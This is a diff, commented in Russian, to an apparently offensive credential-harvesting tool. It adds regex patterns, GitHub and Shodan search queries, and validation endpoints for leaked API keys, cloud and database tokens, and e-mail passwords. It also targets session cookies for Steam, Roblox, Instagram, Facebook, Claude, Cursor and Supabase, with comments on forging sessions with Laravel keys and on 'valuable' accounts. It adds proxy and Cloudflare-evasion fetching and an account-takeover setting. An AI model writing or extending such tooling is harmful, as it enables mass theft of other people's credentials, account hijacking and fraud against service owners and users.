@@ -128,6 +128,25 @@ DEFAULT_CONFIG = {
         "llm proxy sk-",
         "gpt-5.6-sol sk-",
         "glm-5.3 sk-",
+        # 🚀 GLM/Kimi провайдер-волна (2026-09-10): env-присвоения с литералами
+        "ZHIPU_API_KEY=",
+        "MOONSHOT_API_KEY=",
+        "open.bigmodel.cn",
+        "api.moonshot.cn",
+        "api.z.ai",
+        "BASETEN_API_KEY=",
+        "inference.baseten.co",
+        "DEEPINFRA_API_KEY=",
+        "NOVITA_API_KEY=",
+        "CEREBRAS_API_KEY=",
+        "SAMBANOVA_API_KEY=",
+        "CHUTES_API_KEY=",
+        "HYPERBOLIC_API_KEY=",
+        "SUPABASE_SERVICE_ROLE_KEY=",
+        "AZURE_OPENAI_API_KEY=",
+        "WorkosCursorSessionToken=",
+        "sk-proj-",
+        "kimi-k3 api_key",
     ],
     "shodan_queries": [
         'http.html:"sk-ant-api03"',
@@ -156,6 +175,21 @@ DEFAULT_CONFIG = {
     "email_combo_per_cycle": 30,
     "ato_auto": False,
     "hf_terms": ["new-api", "one-api", "openai-proxy", "claude", "chatgpt"],
+    # --- живущие только в keyhunter.json (реген из дефолтов их не убьёт) ---
+    "github_tokens_pool": [],
+    "disabled_sources": [],
+    "relay_boards": [],
+    "vault_repo": "Ins2lt/night-vault",
+    "validate_budget": 1500,
+    "source_timeout": 1200,
+    "shodan_budget": 1080,
+    "shodan_page_mult": 2,
+    "urlscan_key": "",
+    "kaggle_token": "",
+    "leakix_key": "",
+    "virustotal_key": "",
+    "censys_id": "",
+    "censys_secret": "",
 }
 
 LOCK = threading.RLock()
@@ -168,6 +202,11 @@ def gh_token():
     Пул: github_tokens_pool в конфиге + АВТОСИДИНГ живых github-ключей из стора.
     Fallback: github_token."""
     pool = [t for t in (CFG.get("github_tokens_pool") or []) if t]
+    # primary github_token — ВСЕГДА первым в пуле (было: если пул непуст,
+    # primary никогда не использовался, если не дублировался в пуле)
+    _primary = CFG.get("github_token") or ""
+    if _primary and _primary not in pool:
+        pool.insert(0, _primary)
     if not _GH_POOL_ROT["seeded"]:
         with LOCK:  # double-checked: пока один тред сеет, другие ждут
             if not _GH_POOL_ROT["seeded"]:
@@ -328,7 +367,14 @@ def http(
                 json=json_body,
                 data=data,
             )
-            if TRANSPORT.get(host) != name:
+            # 451/502/503 = гео/CF-блок через этот транспорт — пробуем другой
+            # (403 НЕ трогаем: для API это легитный ответ про ключ)
+            if r.status_code in (451, 502, 503) and name == order[0][1]:
+                last = RuntimeError("block-page %d via %s" % (r.status_code, name))
+                continue
+            # пин транспорта только на осмысленном ответе (было: пин на ЛЮБОМ,
+            # включая CF-челлендж — хост навсегда залипал на плохом канале)
+            if r.status_code < 400 and TRANSPORT.get(host) != name:
                 TRANSPORT[host] = name
             return r
         except Exception as e:
@@ -354,23 +400,34 @@ def fetch_text(url, timeout=(8, 20), max_bytes=700_000, headers=None):
 
 
 def cloud_get(url, timeout=(15, 30)):
-    """cloudscraper: сначала с системным прокси, потом direct."""
+    """cloudscraper: сначала через ЯВНЫЙ прокси (10809), потом direct.
+    (было: trust_env=True/False без явного proxies — обе попытки фактически
+    DIRECT, CF-заблокированные источники прокси никогда не видели)."""
     try:
         import cloudscraper
 
-        s = cloudscraper.create_scraper(
-            browser={"browser": "chrome", "platform": "windows", "desktop": True}
-        )
-        try:
-            return s.get(url, timeout=timeout, verify=False)
-        except Exception:
-            s2 = cloudscraper.create_scraper(
-                browser={"browser": "chrome", "platform": "windows", "desktop": True}
-            )
-            s2.trust_env = False
-            return s2.get(url, timeout=timeout, verify=False)
+        for use_proxy in (True, False):
+            try:
+                s = cloudscraper.create_scraper(
+                    browser={
+                        "browser": "chrome",
+                        "platform": "windows",
+                        "desktop": True,
+                    }
+                )
+                s.trust_env = False
+                if use_proxy:
+                    s.proxies = dict(PROXY.proxies)
+                r = s.get(url, timeout=timeout, verify=False)
+                # CF-челлендж через прокси -> пробуем direct
+                if r.status_code in (403, 503) and use_proxy:
+                    continue
+                return r
+            except Exception:
+                continue
     except Exception:
-        return None
+        pass
+    return None
 
 
 def cloudscraper_ok():
@@ -383,11 +440,12 @@ def cloudscraper_ok():
 
 
 def _cloud_get_hdrs(url, headers, timeout=(15, 30)):
-    """cloudscraper GET с кастомными заголовками (Cookie и т.п.)."""
+    """cloudscraper GET с кастомными заголовками (Cookie и т.п.).
+    Попытка 1 через явный прокси, попытка 2 direct."""
     try:
         import cloudscraper
 
-        for trust in (True, False):
+        for use_proxy in (True, False):
             try:
                 s = cloudscraper.create_scraper(
                     browser={
@@ -396,7 +454,9 @@ def _cloud_get_hdrs(url, headers, timeout=(15, 30)):
                         "desktop": True,
                     }
                 )
-                s.trust_env = trust
+                s.trust_env = False
+                if use_proxy:
+                    s.proxies = dict(PROXY.proxies)
                 return s.get(url, headers=headers, timeout=timeout, verify=False)
             except Exception:
                 continue
@@ -448,24 +508,22 @@ KEY_PATTERNS = [
     # "aws_secret_access_key = " между ними)
     (
         "aws",
-        r"AKIA[0-9A-Z]{16}[\s\"':=a-zA-Z_]{1,50}[A-Za-z0-9/+=]{40}",
+        # АУДИТ-фикс: +",;" в зазор — JSON/CSV-пары "AKIA...","secret..."
+        r"AKIA[0-9A-Z]{16}[\s\"':=,;a-zA-Z_]{1,50}[A-Za-z0-9/+=]{40}",
         [],
         False,
     ),
-    # Slack bot tokens (рабочие пространства, приложения)
+    # Slack токены всех типов (аудит-фикс: был только xoxb-):
+    # b=bot, p=user, s=session, a=app-level — auth.test валидирует любой
     (
         "slack",
-        r"xoxb-[0-9]{10,13}-[0-9]{10,13}-[A-Za-z0-9]{20,30}",
+        r"xox[bpoas]-[0-9]{10,13}-[0-9]{10,13}(?:-[0-9]{10,13})?-[A-Za-z0-9]{20,40}",
         [],
         False,
     ),
-    # Google OAuth refresh-токены (1//0... — полный доступ к Google-аккаунту)
-    (
-        "google-refresh",
-        r"1//0[A-Za-z0-9_.\-]{40,}",
-        [],
-        False,
-    ),
+    # Google OAuth refresh-токены УБРАНЫ (2026-09-09): голый refresh_token без
+    # client_id/client_secret невалидируем (валидатора нет и не будет) —
+    # кандидаты висели вечными unverified и жгли бюджет. 0 находок за всё время.
     # ADMIN-ключи Anthropic (org-уровень, корпоративная консоль)
     (
         "anthropic-admin",
@@ -576,6 +634,17 @@ KEY_PATTERNS = [
         ],
         False,
     ),
+    # Zhipu GLM официал (bigmodel.cn / z.ai): формат {32hex}.{secret} —
+    # БЕЗ этого паттерна glm-ключи вообще не извлекались из дампов!
+    (
+        "zhipu",
+        r"(?<![A-Za-z0-9])[0-9a-f]{32}\.[A-Za-z0-9_\-]{10,40}(?![A-Za-z0-9_\-])",
+        [
+            "https://open.bigmodel.cn/api/paas/v4",
+            "https://api.z.ai/api/paas/v4",
+        ],
+        False,
+    ),
     ("groq", r"gsk_[A-Za-z0-9]{30,}", ["https://api.groq.com/openai/v1"], False),
     (
         "huggingface",
@@ -585,7 +654,9 @@ KEY_PATTERNS = [
     ),
     ("google", r"AIza[0-9A-Za-z_\-]{35}", [], False),
     ("logfare", r"lfu_[A-Za-z0-9_\-]{15,}", ["https://logfare.ai/v1"], False),
-    ("voyage", r"pa_[A-Za-z0-9_\-]{20,}", ["https://api.voyageai.com/v1"], False),
+    # voyage: pa- с ДЕФИСОМ (реальный формат). Старый pa_ ловил норвежские
+    # doc-слаги ("pa_en_tabell_-_649") — 0 рабочих за всё время.
+    ("voyage", r"pa-[A-Za-z0-9]{20,}", ["https://api.voyageai.com/v1"], False),
     ("xai", r"xai-[A-Za-z0-9]{30,}", ["https://api.x.ai/v1"], False),
     (
         "openai-svcacct",
@@ -698,10 +769,37 @@ KEY_PATTERNS = [
         [],
         False,
     ),
-    # 64-hex (bigmodel/qianfan/paratera style) — строго с контекстом
-    ("hex64", r"\b[a-f0-9]{64}\b", [], True),
+    # hex64/hex48 УБРАНЫ (2026-09-09): 185+ unverified в сторе, 0 рабочих за
+    # всё время — это git-SHA/контент-хэши рядом с URL, а не ключи. hex32
+    # оставлен: по нему есть реальные no_balance/working (dashscope-стиль).
     ("hex32", r"\b[a-f0-9]{32}\b", [], True),
-    ("hex48", r"\b[a-f0-9]{48}\b", [], True),
+    # 🔑 Laravel APP_KEY: ключ шифрования сессий фреймворка — с ним форжим
+    # куку ЛЮБОГО юзера приложения (session fixation без пароля)
+    ("laravel-appkey", r"APP_KEY=base64:[A-Za-z0-9+/]{40,44}={0,2}", [], False),
+    # 🔑 Google OAuth client secret: GOCSPX-xxx (24+). Пара с client_id (часто
+    # рядом в контексте) = OAuth-поток от имени чужого приложения
+    ("gocspx", r"GOCSPX-[A-Za-z0-9_\-]{24,}", [], False),
+    # ☁️ инфра-токены (экспорт-разбор: cloudflare/npm/linear/figma/twilio/shopify)
+    (
+        "cloudflare",
+        r"(?<![A-Za-z0-9_\-])[A-Za-z0-9_\-]{37,44}(?![A-Za-z0-9_\-])",
+        [],
+        True,
+    ),  # CF токен 37-40ch + контекст
+    ("npm", r"npm_[A-Za-z0-9]{36}", [], False),
+    ("linear", r"lin_api_[A-Za-z0-9]{30,}", [], False),
+    ("figma", r"figd_[A-Za-z0-9_\-]{30,}", [], False),
+    # Twilio: SK + Account SID рядом (env-файлы: SID строкой выше) — с парой
+    # живая валидация api.twilio.com/Accounts/{sid}.json
+    ("twilio", r"(?:AC[0-9a-f]{32}[\s\S]{0,40}?)?SK[0-9a-f]{32}\b", [], False),
+    # Shopify: токен + домен магазина рядом — с доменом валидация /admin/api
+    (
+        "shopify",
+        r"(?:[a-z0-9][a-z0-9\-]{2,60}\.myshopify\.com[\s\S]{0,40}?)?(?:shpat|shpca|shpss)_[A-Za-z0-9]{32,}",
+        [],
+        False,
+    ),
+    ("sentry", r"sntrys_[A-Za-z0-9_\-]{30,}", [], False),
     # --- НЕОРДИНАРНАЯ ВОЛНА: DB-креды и Google-сессии из логов/экспортов ---
     # postgres://user:pass@host/db — 487 таких в TG-экспортах, валидируются логином
     (
@@ -834,6 +932,112 @@ KEY_PATTERNS = [
         [],
         False,
     ),
+    # 🎮 ЖИРНЫЕ СЕССИИ (2026-09-10): аккаунты с деньгами/инвентарём.
+    # Steam: steamLoginSecure=<steamid64>%7C%7C<token> — игры/баланс/маркет
+    (
+        "websess",
+        r"steamLoginSecure=[A-Za-z0-9%_\-]{30,}",
+        [],
+        False,
+    ),
+    # Roblox: .ROBLOSECURITY=_|WARNING:...|_<blob> — акк с ROBUX/предметами
+    (
+        "websess",
+        r"\.ROBLOSECURITY=_\|WARNING:[^|]{10,}\|_[A-Za-z0-9+/=]{80,}",
+        [],
+        False,
+    ),
+    # Instagram: sessionid (netscape-строки instagram.com — loose "sessionid"
+    # слишком generic: Django/Flask все так называют)
+    (
+        "websess",
+        r"(?m)^\.?instagram\.com\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
+        r"\tsessionid\t[^\s]{20,}",
+        [],
+        False,
+    ),
+    # X/Twitter: auth_token (netscape twitter.com/x.com) — полная сессия
+    (
+        "websess",
+        r"(?m)^\.?(?:twitter|x)\.com\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
+        r"\tauth_token\t[0-9a-f]{40}",
+        [],
+        False,
+    ),
+    # Facebook: c_user + xs парой (netscape facebook.com)
+    (
+        "websess",
+        r"(?m)^\.?facebook\.com\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
+        r"\t(?:c_user|xs)\t[^\s]{15,}(?:\n\.?facebook\.com\t(?:TRUE|FALSE)\t\S+"
+        r"\t(?:TRUE|FALSE)\t\d+\t(?:c_user|xs)\t[^\s]{15,})",
+        [],
+        False,
+    ),
+    # Reddit: reddit_session (netscape reddit.com)
+    (
+        "websess",
+        r"(?m)^\.?reddit\.com\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
+        r"\treddit_session\t[^\s]{20,}",
+        [],
+        False,
+    ),
+    # Twitch: auth-token (netscape twitch.tv) — стример-аккаунт
+    (
+        "websess",
+        r"(?m)^\.?twitch\.tv\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
+        r"\tauth-token\t[0-9a-z]{30}",
+        [],
+        False,
+    ),
+    # 🤖 AI-ПОДПИСКИ (2026-09-10): сессии на сервисы с сильными моделями.
+    # Cursor (WorkOS JWT-сессия): Pro = GPT/Claude в редакторе
+    (
+        "cursor-web",
+        r"WorkosCursorSessionToken=eyJ[A-Za-z0-9_\-.]{100,}",
+        [],
+        False,
+    ),
+    # Microsoft Copilot/Office: MSPAuth (live.com сессия)
+    (
+        "websess",
+        r"MSPAuth=[A-Za-z0-9!*$%_\-]{100,}",
+        [],
+        False,
+    ),
+    # Poe (Quora): m-b cookie — Claude/GPT в одном акке
+    (
+        "websess",
+        r"(?m)^\.?poe\.com\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
+        r"\tm-b\t[^\s]{20,}",
+        [],
+        False,
+    ),
+    # Perplexity Pro: next-auth session-token (netscape perplexity.ai)
+    (
+        "websess",
+        r"(?m)^\.?perplexity\.ai\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
+        r"\t__Secure-next-auth\.session-token\t[^\s]{50,}",
+        [],
+        False,
+    ),
+    # Supabase auth cookie (Lovable/Bolt/тысячи supabase-аппов): sb-<ref>-
+    # auth-token = JSON {access_token, refresh_token} — refresh = вечная сессия
+    (
+        "supabase-auth",
+        r"sb-[a-z0-9]{15,25}-auth-token(?:\.0)?=(?:base64-)?[A-Za-z0-9%_.+/=\-]{60,}",
+        [],
+        False,
+    ),
+    # Claude web: sessionKey (netscape claude.ai — loose sid01 ловит value,
+    # тут фиксируем домен для чистого origin)
+    (
+        "websess",
+        r"(?m)^\.?claude\.ai\t(?:TRUE|FALSE)\t\S+\t(?:TRUE|FALSE)\t\d+"
+        r"\tsessionKey\tsk-ant-sid0[12]-[A-Za-z0-9_\-]{20,}",
+        [],
+        False,
+    ),
+    # Discord: token (не кука, но та же ценность — в шодан-разделе есть запрос)
     # Generic Cookie-заголовок из лог-дампов: бег 2+ кук (capture = весь header).
     # Разделитель потребляется ТОЛЬКО между куками (lookahead, как в gcookie) —
     # иначе матч прилипает к следующей строке лога и режется boundary-чеком.
@@ -841,7 +1045,7 @@ KEY_PATTERNS = [
     # имя до 64 симв: WP-куки = wordpress_logged_in_ + md5 = 52 симв!
     (
         "websess",
-        r"(?<![a-zA-Z\-])Cookie:\s*((?:[A-Za-z0-9_.\-]{1,64}=[^;\s\"'<>]{4,}"
+        r"(?<![a-zA-Z\-])Cookie\"?\s*:\s*\"?\s*((?:[A-Za-z0-9_.\-]{1,64}=[^;\s\"'<>]{4,}"
         r"(?:[;\s]+(?=[A-Za-z0-9_.\-]{1,64}=[^;\s\"'<>]{4,}))?){2,})",
         [],
         False,
@@ -871,7 +1075,10 @@ KEY_PATTERNS = [
         False,
     ),
     ("airtable", r"pat[A-Za-z0-9]{14}\.[0-9a-f]{64}", [], False),
-    ("notion", r"(?:ntn_|secret_)[A-Za-z0-9]{43}", [], False),
+    # АУДИТ-фикс: ntn_-токены длиннее 43 после префикса — {43} обрезал живые
+    # ключи (boundary-check потом ронял матч вообще). {43,} + граница сама
+    # отсечёт хвост.
+    ("notion", r"(?:ntn_|secret_)[A-Za-z0-9]{43,}", [], False),
     ("sendgrid", r"SG\.[A-Za-z0-9_\-]{16,}\.[A-Za-z0-9_\-]{16,}", [], False),
 ]
 KNOWN_PREFIX_BLACKLIST = (
@@ -906,8 +1113,12 @@ PLACEHOLDER_SUBSTR_RE = re.compile(
 # ДОКИ-ПЛЕЙСХОЛДЕРЫ из github-issues/grep.app: sk-ant-api03-test-key-for-...,
 # sk-ant-api03-AAAAAAAA..., sk-ant-oat01-aaaBBBcccDDDeee, abcdefghij...
 JUNKY_KEY_RE = re.compile(
-    r"test[-_]?(key|token|api)|fake[-_]|dummy[-_]?(key|token)|"
-    r"sample[-_]?(key|token)|abcdefgh|aaabbb|qwerty|"
+    # АУДИТ-КРИТ-ФИКС: в альтернации с захватывающими группами \1 ссылался
+    # на ПЕРВУЮ группу паттерна ((key|token|api)), а НЕ на (.) — детектор
+    # прогонов был мёртв с рождения (sk-xxxxxxxx... проходил на ура).
+    # Все группы — незахватывающие, (.) остаётся группой №1.
+    r"test[-_]?(?:key|token|api)|fake[-_]|dummy[-_]?(?:key|token)|"
+    r"sample[-_]?(?:key|token)|abcdefgh|aaabbb|qwerty|"
     r"(.)\1{7,}",  # прогон одного символа 8+ раз (AAAAAAA...)
     re.I,
 )
@@ -915,7 +1126,9 @@ JUNKY_KEY_RE = re.compile(
 # слаги из JS/HTML (sk-content-wrapper, sk-belfast-riots-anti-immigration).
 # У реального ключа на 20+ символах ВСЕГДА есть цифры/заглавные/подчёркивания;
 # структурные префиксы (sk-ant-oat01, sk-or-v1) содержат цифры — не задевает.
-SK_SLUG_RE = re.compile(r"^sk-[a-z]+(?:-[a-z]+)*$")
+SK_SLUG_RE = re.compile(r"^sk-[a-z]+(?:-[a-z]+)+$")  # >=1 дефис-группа
+# (было (?:-[a-z]+)* — ноль групп = ЛЮБОЙ sk- + lowercase без дефисов
+# считался CSS-слагом и резал настоящие длинные токены: 24 ключа ушли мимо)
 
 URL_RE = re.compile(r"https?://[A-Za-z0-9\.\-_]+(?::\d+)?(?:/[A-Za-z0-9\.\-_/]*)?")
 BASE_HINT_RE = re.compile(
@@ -941,7 +1154,21 @@ BAD_BASE_RE = re.compile(
 
 
 def bad_base(url):
-    return bool(url and BAD_BASE_RE.search(url))
+    if not url:
+        return False
+    # известные релеи — легитимны всегда (agentrouter/gorouter и пр. без
+    # apiish-подстроки в хосте не должны отбрасываться)
+    if url.rstrip("/") in KNOWN_BASES:
+        return False
+    # BAD_BASE_RE применяем К ПУТИ, а не к полному URL (было: search/docs/
+    # track/clarity/beacon матчились внутри ИМЕНИ ХОСТА —
+    # https://search.foo.com/v1, https://docs.foo.com, https://clarity.ai
+    # ложно отвергались как «мусорные»)
+    try:
+        path = urlparse(url).path or ""
+    except Exception:
+        path = url
+    return bool(BAD_BASE_RE.search(path))
 
 
 KNOWN_BASES = {
@@ -1067,6 +1294,42 @@ KNOWN_BASES = {
     "https://api.fireworks.ai/inference/v1": None,
     "https://opencode.ai/zen/v1": None,
     "https://opencode.ai/zen/go/v1": None,
+    # релеи из ZK-экспорта (2026-09-10): там ходят ключи — базы нужны валидатору
+    "https://apinex.bond/v1": None,
+    "https://linkapi.ai/v1": None,
+    "https://free.sysik.mom/v1": None,
+    "https://flag.smarttrot.com/v1": None,
+    "https://litellm.in.dev.spotdraft.com/v1": None,
+    # ==== 🚀 GLM-5.x / Kimi-K3 КЭРРИЕРЫ (экспансия 2026-09-10) ====
+    # официалы + провайдеры, у которых реально хостятся glm/kimi — ключи
+    # от этих баз = доступ к флагманским моделям, а не к фри-хламу
+    "https://api.deepinfra.com/v1/openai": None,
+    "https://api.novita.ai/v3/openai": None,
+    "https://api.novita.ai/v1": None,
+    "https://api.cerebras.ai/v1": None,
+    "https://api.sambanova.ai/v1": None,
+    "https://api.chutes.ai/v1": None,
+    "https://api.featherless.ai/v1": None,
+    "https://api.parasail.io/v1": None,
+    "https://api.hyperbolic.xyz/v1": None,
+    "https://api.nineteen.ai/v1": None,
+    "https://api.lambdalabs.com/v1": None,
+    "https://api.glhf.chat/v1": None,
+    "https://router.requesty.ai/v1": None,
+    "https://api.lingyiwanwu.com/v1": None,
+    "https://api.minimax.io/v1": None,
+    "https://api.minimax.chat/v1": None,
+    "https://ark.cn-beijing.volces.com/api/v3": None,
+    "https://spark-api-open.xf-yun.com/v1": None,
+    "https://api.baichuan-ai.com/v1": None,
+    "https://api.baseten.co/v1": None,
+}
+# Базы, отдающие /models ВООБЩЕ без auth (проверено живьём 2026-09-10:
+# aimlapi — 937 моделей на голый GET). listed_only на них доказывает ноль —
+# валидатор скипает такие записи (chat на мусоре там всё равно 401).
+PUBLIC_MODELS_BASES = {
+    "https://api.aimlapi.com/v1",
+    "https://api.ppq.ai/v1",
 }
 # для hex* с контекстом: если контекст-URL без явного base — не валидируем (шум)
 CONTEXT_WINDOW = 350
@@ -1077,14 +1340,20 @@ def find_base_in_context(ctx):
         u = hm.group(2)
         if (
             u.startswith("http")
-            and APIISH.search(u)
+            # известные релеи принимаем без apiish-подстроки (было:
+            # agentrouter.org/gorouter.app из KNOWN_BASES отбрасывались)
+            and (APIISH.search(u) or u.rstrip("/") in KNOWN_BASES)
             and not SKIP_URL_RE.search(u)
             and not bad_base(u)
         ):
             return u.rstrip("/,;\"')")
     for um in URL_RE.finditer(ctx):
         u = um.group(0).rstrip("/")
-        if APIISH.search(u) and not SKIP_URL_RE.search(u) and not bad_base(u):
+        if (
+            (APIISH.search(u) or u in KNOWN_BASES)
+            and not SKIP_URL_RE.search(u)
+            and not bad_base(u)
+        ):
             return u
     return None
 
@@ -1144,6 +1413,11 @@ def extract_email_creds(text, limit=20):
     out = []
     for m in EMAIL_PASS_RE.finditer(text):
         email, pwd = m.group(1), m.group(2)
+        # double-@ = не email, а DSN-фрагмент (GOCSPX-xxx@pooler.supabase.com,
+        # user@host из postgres-строки) — IMAP-валидатор бы тратил на них
+        # коннекты впустую
+        if email.count("@") != 1:
+            continue
         dom = email.rsplit("@", 1)[-1].lower()
         if dom in CRED_BAD_DOMAINS or dom.endswith((".png", ".jpg", ".js")):
             continue
@@ -1152,6 +1426,8 @@ def extract_email_creds(text, limit=20):
             continue
         if any(c in pwd for c in "<>{}[]()"):
             continue  # это код/HTML, не пароль
+        if pwd.startswith(("GOCSPX-", "sk-", "xox", "ghp_", "glpat-")):
+            continue  # это токен, а не пароль почты
         out.append((email, pwd))
         if len(out) >= limit:
             break
@@ -1175,7 +1451,15 @@ def extract_candidates(text):
                 continue
             if mstart > 0 and text[mstart - 1] in "_-":
                 continue
-            if key.lower().startswith(KNOWN_PREFIX_BLACKLIST):
+            # АУДИТ-фикс: startswith по блэклисту убивал РЕАЛЬНЫЕ ключи вида
+            # sk-1234abcd... (случайное совпадение 1/62^4, при миллионах
+            # кандидатов — считаные, но живые потери). Требуем разделитель
+            # после префикса или точное совпадение.
+            _kl = key.lower()
+            if any(
+                _kl == p or (_kl.startswith(p) and _kl[len(p)] in "-_.")
+                for p in KNOWN_PREFIX_BLACKLIST
+            ):
                 continue
             if PLACEHOLDER_SUBSTR_RE.search(key):
                 continue
@@ -1183,6 +1467,38 @@ def extract_candidates(text):
                 continue  # доки-плейсхолдеры: test-key, AAAAAAA, abcdefgh
             if len(key) >= 14 and SK_SLUG_RE.match(key):
                 continue  # CSS-слаги: sk-content-wrapper, sk-lightbox-image-...
+            # NL-слаги документов: "sk-elghund-graa-h2", "sk-coverage-form---
+            # aiic-dp-09-br-01-08" — дефисные человеческие слова. Настоящие
+            # ключи после sk- — один цельный токен (deepseek hex32 без дефисов,
+            # proj/ant-префиксы с mixed-case). Убивает спам-валидации на
+            # free-релеях (ppq/aimlapi "валидируют" любой мусор).
+            if tag in ("skgen", "sk20", "sk32", "sklong", "bearer") and re.fullmatch(
+                r"[a-z]{2,}(?:-+[a-z]+[0-9]*|-+[0-9]+){2,}", key
+            ):
+                continue
+            # NL-слаги MIXED-CASE: "sk-Foto-Gage-Skidmore-lanka-till-1146x478"
+            # (имена файлов с фотостоков). 4+ сегмента, 3+ из них — чисто
+            # буквенные слова. Порог 3 (был 2): сегментированные ключи вида
+            # sk-WK-rM6H3V-XBxYB-AUnn выживают, трёхсловные слаги режутся.
+            # АУДИТ-фикс: +bearer — slug через bearer-паттерн раньше пролетал мимо
+            if tag in ("skgen", "sk20", "sk32", "sklong", "bearer"):
+                segs = key.split("-")
+                if len(segs) >= 4:
+                    alpha_segs = sum(
+                        1 for s in segs if re.fullmatch(r"[A-Za-z]{3,}", s or " ")
+                    )
+                    if alpha_segs >= 3 and all(
+                        re.fullmatch(r"[A-Za-z0-9]+", s or " ") for s in segs
+                    ):
+                        continue
+            # UNDERSCORE-СЛАГИ (волна 2026-09-10, датский фотосток):
+            # sk-andetsprog_41c7665f6a, sk-musik-forside_189073ff65 —
+            # слова через "_"/"-" + короткий hex-хвост. У настоящих ключей
+            # тело mixed-case/цифры целиком, а не "слово_слово_hex".
+            if tag in ("skgen", "sk20", "sk32", "sklong", "bearer") and re.fullmatch(
+                r"sk-[a-z]{3,}(?:[-_][a-z]{2,})*[-_][0-9a-f]{6,14}", key
+            ):
+                continue
             if len(set(key.lower())) <= 3:
                 continue  # мусор: aaaaaa / abcabc / 111111
             if key in ("https", "http"):
@@ -1207,7 +1523,8 @@ def extract_candidates(text):
                 out.append((_k, "email-cred", None))
     # baseten: 8.32 ключ (aEXAlxkF.x32) — только рядом с baseten-контекстом
     # (без контекста это случайный мусор вида слов.слов)
-    if re.search(r"baseten|BASETEN|inference\.baseten", text):
+    # АУДИТ-фикс: re.I — "Baseten"/"BASETEN" в mixed-case раньше не матчились
+    if re.search(r"baseten|inference\.baseten", text or "", re.I):
         for m in _BASETEN_KEY_RE.finditer(text):
             k = m.group(0)
             if not any(b in k.lower() for b in _BASETEN_BAD):
@@ -1242,28 +1559,35 @@ class Gists(Source):
     def fetch(self):
         out = []
         headers = {"Accept": "application/vnd.github+json"}
-        if gh_token():
-            headers["Authorization"] = "Bearer " + gh_token()
+        _gtok = gh_token()  # один вызов = один слот ротации (было: проверка
+        # и хедер звали gh_token() дважды — проверялся не тот токен)
+        if _gtok:
+            headers["Authorization"] = "Bearer " + _gtok
         pages = max(1, int(CFG.get("deep_gists_pages") or 1))  # --deep: xN страниц
         gists = []
-        try:
-            for pg in range(1, pages + 1):
+        # АУДИТ-фикс: общий try вокруг ВСЕХ страниц — один сетевой сбой на
+        # стр.3 выбрасывал уже собранные 200 гистов. Per-page try + break.
+        for pg in range(1, pages + 1):
+            try:
                 r = http(
                     "GET",
                     "https://api.github.com/gists/public?per_page=100&page=%d" % pg,
                     timeout=(8, 15),
                     headers=headers,
                 )
-                if r.status_code != 200:
-                    log("  [github-gists] HTTP%s (rate?)" % r.status_code)
+                if r is None or r.status_code != 200:
+                    log(
+                        "  [github-gists] HTTP%s (rate?)"
+                        % (r.status_code if r else "None")
+                    )
                     break
                 batch = r.json()
                 if not batch:
                     break
                 gists += batch
-            gists = gists[: CFG["max_gists"] * pages]
-        except Exception:
-            return out
+            except Exception:
+                break
+        gists = gists[: CFG["max_gists"] * pages]
         with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
             futs = {}
             for g in gists:
@@ -1338,11 +1662,16 @@ class GrepApp(Source):
                     continue
                 hits = (r.json().get("hits") or {}).get("hits") or []
                 for h in hits[:15]:
-                    repo, branch, path = (
-                        h.get("repo"),
-                        h.get("branch") or "main",
-                        h.get("path"),
-                    )
+                    # grep.app API: repo/branch/path — объекты {"raw": "..."},
+                    # НЕ строки (был AttributeError -> весь источник молча пуст)
+                    def _raw(x, default=""):
+                        if isinstance(x, dict):
+                            return x.get("raw") or default
+                        return x or default
+
+                    repo = _raw(h.get("repo"))
+                    branch = _raw(h.get("branch"), "main")
+                    path = _raw(h.get("path"))
                     if repo and path:
                         raw_urls.add(
                             "https://raw.githubusercontent.com/%s/%s/%s"
@@ -1618,6 +1947,52 @@ class GitHubCode(Source):
             '"tu-zi.com"',
             '"new-api" "sk-" extension:env',
             '"one-api" "sk-" path:.env',
+            # 🔥 ENV-ДАМП волна (2026-09-09): laravel/spring/docker/litellm
+            '"APP_KEY=base64:" extension:env',  # laravel: форж сессий
+            '"LITELLM_MASTER_KEY" extension:env',  # litellm мастера
+            '"LITELLM_MASTER_KEY" extension:yml',
+            '"OPENAI_API_KEY" extension:yml path:.github',  # CI-конфиги
+            '"propertySources" "password"',  # spring actuator дампы
+            '"service_role" "supabase" extension:env',  # supabase service_role!
+            '"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" "supabase"',  # supabase JWT
+            '"firebase" "private_key" extension:json',  # GCP service accounts
+            '"VERCEL_TOKEN" extension:env',
+            '"RAILWAY_TOKEN" extension:env',
+            '"CLOUDFLARE_API_TOKEN" extension:env',
+            '"DIGITALOCEAN_TOKEN" extension:env',
+            '"npm_" "registry" filename:.npmrc',  # npm tokens
+            '"pypi-" filename:.pypirc',  # pypi tokens
+            '"cph_"',  # codepad/прочее
+            '"sk-ant-oat01" extension:log',  # логи CC сессий
+            '"sk-live" "claude"',  # claude live-ключи проксей
+            # 🚀 GLM-5.x / Kimi-K3 ПРОВАЙДЕР-ВОЛНА (2026-09-10): официалы и
+            # кэрриеры — env-дампы с живыми ключами (zhipu/moonshot/novita...)
+            '"ZHIPU_API_KEY"',
+            '"ZHIPUAI_API_KEY"',
+            '"GLM_API_KEY"',
+            '"BIGMODEL_API_KEY"',
+            '"open.bigmodel.cn" "apiKey"',
+            '"api.z.ai" "api_key"',
+            '"MOONSHOT_API_KEY" path:.env',
+            '"MOONSHOT_API_KEY" "sk-"',
+            '"api.moonshot.cn" extension:env',
+            '"api.moonshot.ai" "sk-"',
+            '"SILICONFLOW_API_KEY" path:.env',
+            '"DEEPINFRA_API_KEY"',
+            '"NOVITA_API_KEY"',
+            '"CEREBRAS_API_KEY"',
+            '"SAMBANOVA_API_KEY"',
+            '"CHUTES_API_KEY"',
+            '"HYPERBOLIC_API_KEY"',
+            '"FEATHERLESS_API_KEY"',
+            '"STEPFUN_API_KEY"',
+            '"MINIMAX_API_KEY"',
+            '"ARK_API_KEY"',  # volcengine doubao
+            '"DASHSCOPE_API_KEY" path:.env',
+            '"kimi-k3" "sk-"',
+            '"kimi-k3" "api_key"',
+            '"glm-5" "api_key" path:.env',
+            '"glm-5.3" "apiKey"',
